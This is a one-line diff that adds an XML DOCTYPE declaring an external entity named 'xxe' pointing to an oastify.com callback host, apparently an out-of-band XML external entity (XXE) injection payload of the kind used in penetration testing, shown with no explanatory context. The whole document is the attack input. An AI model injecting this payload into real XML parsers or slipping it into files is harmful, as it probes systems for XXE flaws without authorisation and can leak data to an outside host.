@@ -1,0 +1,1 @@
+<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "https://sd9t4ulebdbxcqoe5wownwgzlqrhf6.oastify.com"> ]>
